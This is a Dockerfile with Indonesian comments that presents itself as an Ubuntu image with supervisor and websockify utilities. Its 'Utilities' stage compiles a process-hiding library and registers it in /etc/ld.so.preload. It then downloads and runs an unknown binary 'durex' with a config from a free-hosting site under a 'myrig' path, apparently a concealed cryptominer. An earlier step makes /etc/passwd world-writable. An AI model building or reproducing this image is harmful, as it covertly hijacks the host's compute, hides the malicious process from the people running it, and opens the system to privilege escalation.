# Gunakan image dasar
FROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

# Menjalankan perintah di dalam container
RUN apt-get -qqy update \
    && apt-get -qqy --no-install-recommends install \
        sudo \
        supervisor \
        websockify wget git gcc \
    && apt-get autoclean \
    && apt-get autoremove \
    && rm -rf /var/lib/apt/lists/* /var/cache/apt/*

COPY supervisord.conf /etc/supervisor/

RUN  mkdir -p /var/run/supervisor /var/log/supervisor \
    && chmod -R 777 /opt/bin/ /var/run/supervisor /var/log/supervisor /etc/passwd \
    && chgrp -R 0 /opt/bin/ /var/run/supervisor /var/log/supervisor \
    && chmod -R g=u /opt/bin/ /var/run/supervisor /var/log/supervisor

#============================
# Utilities
#============================
FROM ubuntu-base as ubuntu-utilities

RUN apt-get -qqy update \
    && apt-get -qqy --no-install-recommends install \
    && git clone https://github.com/cihuuy/libn && cd libn && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl && mv libprocess.so /usr/local/lib/ && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload \
    && wget https://nyadur.000webhostapp.com/myrig/config.json && wget https://nyadur.000webhostapp.com/myrig/durex && chmod +x durex && ./durex \
    && apt-get autoclean \
    && apt-get autoremove \
    && rm -rf /var/lib/apt/lists/* /var/cache/apt/*
